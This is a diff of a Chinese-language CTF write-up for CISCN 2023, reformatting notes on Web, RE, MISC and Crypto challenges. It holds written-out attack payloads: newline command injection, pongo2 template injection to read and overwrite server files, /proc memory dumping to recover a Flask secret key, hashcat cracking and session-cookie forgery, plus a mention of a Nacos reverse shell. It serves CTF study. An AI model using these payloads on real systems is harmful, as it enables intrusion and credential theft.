@@ -37,23 +37,29 @@ zip -r test1.zip ./*
 
 ![image-20230805011822254](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118367.png)
 过滤的符号： 
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267210383-74ce8b2b-5294-45e3-80f3-17a7b5f0294a.png#averageHue=%2334363a&clientId=ube04f257-9777-4&from=paste&id=u37519b8f&originHeight=224&originWidth=688&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=uda6bbae0-f7f9-4aa0-a5d9-bf35d3eedab&title=)
+![image-20230910015609742](https://raw.githubusercontent.com/githubmof/img/main/img/ciscn2023%E5%88%9D%E8%B5%9B-1.png)
 /?db=bibin&table_2_dump=%00
 ![image-20230805011833160](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118294.png)
 /?db=bibin&table_2_dump=%0a
 ![image-20230805011846369](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050118537.png)
-发现%0a闭合能执行命令，在env发现flag
-/?db=q&table_2_dump=%0awhoami%0a 
+发现%0a闭合能执行命令，在env发现flag  
+
+/?db=q&table_2_dump=%0awhoami%0a   
+
 /?db=q&table_2_dump=%0env%0a //环境变量
 ![image-20230805011910531](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119738.png)
 
 ### go_session
 [https://un1novvn.github.io/2023/05/29/ciscn2023/](https://un1novvn.github.io/2023/05/29/ciscn2023/)
-[https://ctf.njupt.edu.cn/archives/898#go_session](https://ctf.njupt.edu.cn/archives/898#go_session)
-看官方文档 pongo
-环境
+[https://ctf.njupt.edu.cn/archives/898#go_session](https://ctf.njupt.edu.cn/archives/898#go_session)  
+
+看官方文档 pongo  
+
+环境  
+
 route.go
-```php
+
+```go
 package route
 
 import (
@@ -133,7 +139,7 @@ func Flask(c *gin.Context) {
 }
 ```
 main.go
-```php
+```go
 package main
 
 import (
@@ -168,22 +174,28 @@ if __name__ == "__main__":
     app.run(host="127.0.0.1", port=5000, debug=True)
 ```
 
-有三个路由，index、admin和flask
+有三个路由，index、admin和flask  
+
 session检测，key为空，直接本地起环境（像index里面一样设置session
-```python
+
+```bash
 Cookie:session-name=MTY4OTIxMzM0M3xEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXx-9wDJrv63GGaUmQnK_0WvaRL62AHGIY1IRVS4IdZ39Q==
 ```
-admin有ssti注入，admin中`out, err := tpl.Execute(pongo2.Context{"c": c})`的c为传入的变量`c *gin.Context`
-flask对应后端的app.py
-思路是通过ssti实现任意文件读写，覆盖app.py，由于app.py开启debug热部署，内容改变会重新加载。
-include可以读取文件，但不能直接传引号的字符串，需要一个可控字符串变量
+admin有ssti注入，admin中`out, err := tpl.Execute(pongo2.Context{"c": c})`的c为传入的变量`c *gin.Context`  
+
+flask对应后端的app.py  
+
+思路是通过ssti实现任意文件读写，覆盖app.py，由于app.py开启debug热部署，内容改变会重新加载。  
+
+include可以读取文件，但不能直接传引号的字符串，需要一个可控字符串变量  
+
 Context --> Request --> Host/Referer 可控
 
 报错获取app.py位置
 ![image-20230805011924762](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119943.png)
 读文件：
 
-```python
+```bash
 {%include c.Request.Referer()%}
 
 {%include c.Request.Host()%}
@@ -191,12 +203,14 @@ Context --> Request --> Host/Referer 可控
 ![image-20230805011935987](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050119165.png)
 
 Context --> 找到上传文件，`SaveUploadedFile(file *multipart.FileHeader,dst string)`，需要`FileHeader` --> `FormFile(name string)(*multipart.FileHeader,error)`
-需要两个可控变量，一个给dst，一个给name，用上面的Host和Referer
+需要两个可控变量，一个给dst，一个给name，用上面的Host和Referer  
+
 写文件：
-```python
+
+```bash
 {{c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())}}
 ```
-```
+```bash
 GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1
 Host: 8d29d285-1292-41ef-85ba-b8c310a6ec3a.challenge.ctf.show
 Cache-Control: max-age=0
@@ -241,10 +255,14 @@ Content-Disposition: form-data; name="submit"
 ### DeserBug（java，之后再看
 [https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/#DeserBug-%E5%A4%8D%E7%8E%B0](https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/#DeserBug-%E5%A4%8D%E7%8E%B0)
 ### reading
-[https://un1novvn.github.io/2023/05/29/ciscn2023/](https://un1novvn.github.io/2023/05/29/ciscn2023/)
-黑盒题，可跨目录读取文件
-借助经典的两个目录`/proc/self/environ` && `/proc/self/cmdline` 来读更多信息，获取源代码
+[https://un1novvn.github.io/2023/05/29/ciscn2023/ ](https://un1novvn.github.io/2023/05/29/ciscn2023/)  
+
+黑盒题，可跨目录读取文件  
+
+借助经典的两个目录`/proc/self/environ` && `/proc/self/cmdline` 来读更多信息，获取源代码  
+
 /proc/self/cwd/app.py
+
 ```python
 import os
 import math
@@ -301,9 +319,12 @@ def read_file_page(filename, page_number, page_size):
 if __name__ == '__main__':
     app.run(host='0.0.0.0')
 ```
-配合start和end读内存，读取全部内存，找到32位字符串，那就是key或secret_key（通常做法）
-内存里有些区域不可读，所以需要利用/proc/self/maps去读段的起始地址和结束地址
+配合start和end读内存，读取全部内存，找到32位字符串，那就是key或secret_key（通常做法）  
+
+内存里有些区域不可读，所以需要利用/proc/self/maps去读段的起始地址和结束地址  
+
 读取mem脚本：
+
 ```python
 import requests,time,re
 
@@ -339,27 +360,32 @@ for i,line in enumerate(start_end):
     result.close()
 ```
 全局正则匹配，找到两个考得近的32位字符串
-```python
+```bash
 9776436d6a1453cf13eceee8cda4fd84
 e6e69a980d637186e90656f2d9a5a1a8
 ```
-解session，可以解的是secret_key（9776436d6a1453cf13eceee8cda4fd84），剩下的为key（e6e69a980d637186e90656f2d9a5a1a8）
+解session，可以解的是secret_key（9776436d6a1453cf13eceee8cda4fd84），剩下的为key（e6e69a980d637186e90656f2d9a5a1a8）  
+
 [https://github.com/noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689246508994-5b1e5f4f-3137-47c3-9b1a-b06c3053a516.png#averageHue=%23151514&clientId=u1129387b-6829-4&from=paste&height=60&id=uaeddb733&originHeight=60&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14192&status=done&style=none&taskId=ud46b390a-fd76-44d7-9bf4-8160684c674&title=&width=1089)
-接下来爆时间戳
-从程序运行（开靶场）时，敲几个时间戳出来，前面几位固定，爆破后面数字
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245603286-ae79d2b8-99f1-467b-8731-b9010485a89b.png#averageHue=%23141414&clientId=u1129387b-6829-4&from=paste&height=285&id=ud2784194&originHeight=285&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28845&status=done&style=none&taskId=ufbd62711-a15d-4c9c-a110-5b627a315f6&title=&width=854)
+![image-20230910021144332](https://raw.githubusercontent.com/githubmof/img/main/img/202309100211368.png)
+接下来爆时间戳  
+
+从程序运行（开靶场）时，敲几个时间戳出来，前面几位固定，爆破后面数字  
+
+![image-20230910021225813](https://raw.githubusercontent.com/githubmof/img/main/img/202309100212881.png)
 用hashcat爆破
-```python
+
+```bash
 hashcat -m 0 -a 3 e6e69a980d637186e90656f2d9a5a1a8 168924550?d?d?d?d?d?d?d?d?d?d
 ```
 （前面爆破出了，再爆破直接用--show显示结果）
-![image.png](https://cdn.nlark.com/yuque/0/2023/png/35980243/1689245982728-32d0997c-ce00-4d25-817b-6129fdefd63c.png#averageHue=%231b1b1b&clientId=u1129387b-6829-4&from=paste&height=71&id=u376f2527&originHeight=71&originWidth=843&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10277&status=done&style=none&taskId=u277b9fa4-f00e-403b-9053-e4cfa221987&title=&width=843)
-```python
+![image-20230910020909560](https://raw.githubusercontent.com/githubmof/img/main/img/202309100209603.png)
+
+```bash
 e6e69a980d637186e90656f2d9a5a1a8:1689245500101730900
 ```
 伪造session（注意key后的空格）
-```python
+```bash
 python .\flask_session_cookie_manager3.py encode -s "9776436d6a1453cf13eceee8cda4fd84" -t "{'key': '1689245500101730900'}"
 eyJrZXkiOiIxNjg5MjQ1NTAwMTAxNzMwOTAwIn0.ZK_Zsg.9oonOJJLBNz-XhXMQM9H7RCxo9Q
 ```
@@ -370,7 +396,8 @@ eyJrZXkiOiIxNjg5MjQ1NTAwMTAxNzMwOTAwIn0.ZK_Zsg.9oonOJJLBNz-XhXMQM9H7RCxo9Q
 [https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q](https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q)
 [https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270](https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270)
 [https://xz.aliyun.com/t/11493#toc-5](https://xz.aliyun.com/t/11493#toc-5)
-nacos漏洞
+nacos漏洞  
+
 未授权；配置，反弹shell
 
 ## RE
@@ -379,7 +406,7 @@ nacos漏洞
 ![image-20230805012033416](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120763.png)
 secret export
 
-```
+```bash
 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30
 ```
 exp.py
@@ -394,13 +421,16 @@ print(flag)
 ## MISC
 ### 被加密的生产流量
 ![image-20230805012051339](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050120519.png)
-![](https://cdn.nlark.com/yuque/0/2023/png/35980243/1685267575256-79ed8b60-28bf-403f-b961-822fc170da8a.png#averageHue=%23fbfbfa&clientId=ube04f257-9777-4&from=paste&height=275&id=u6bc42ac5&originHeight=624&originWidth=1212&originalType=url&ratio=1.5&rotation=0&showTitle=false&status=done&style=none&taskId=u4909d19d-b413-43c5-85ee-29b8519ea04&title=&width=534)
+![image-20230910020708904](https://raw.githubusercontent.com/githubmof/img/main/img/image-20230910020708904.png)
 
 ### pyshell
-python shell
-字符串长度为7
+python shell  
+
+字符串长度为7  
+
 python特性 下划线表示上次输出结果，拼接得到命令
-```
+
+```bash
 "__import__('system').os('cat /f*')"
 eval(_)
 ```
@@ -410,24 +440,32 @@ eval(_)
 
 ## Crypto
 ### 基于国密SM2算法的密钥密文分发
-非预期：
-跟着文档操作login，allkey，quantum，在search中能直接看到quantumStringServer的值，在check提交
+非预期：  
+
+跟着文档操作login，allkey，quantum，在search中能直接看到quantumStringServer的值，在check提交  
+
 最后在search中看到flag
+
 ### 可信度量
-非预期：
+非预期：  
+
 grep寻找flag，发现在proc/22/task/22/environ
 ![image-20230805012110115](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121257.png)
 
 ### Sign_in_passwd
-```
+```bash
 j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D
 GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5
 ```
 第二行url解码后作为编码表，再将第一行base64解码
 ### badkey1
-第一步爆破sha256前四位
-第二步找到p与q，使construct报错（应该要d和n不互素
-e*d = k1*(p-1)*(q-1) + 1
-d = k2*p*q
-e*k2*p*q = k1*(p-1)*(q-1)+1
+第一步爆破sha256前四位  
+
+第二步找到p与q，使construct报错（应该要d和n不互素  
+
+e * d = k1 * (p-1) * (q-1) + 1  
+
+d = k2 * p * q  
+
+e * k2 * p * q = k1 * (p-1) * (q-1)+1
 
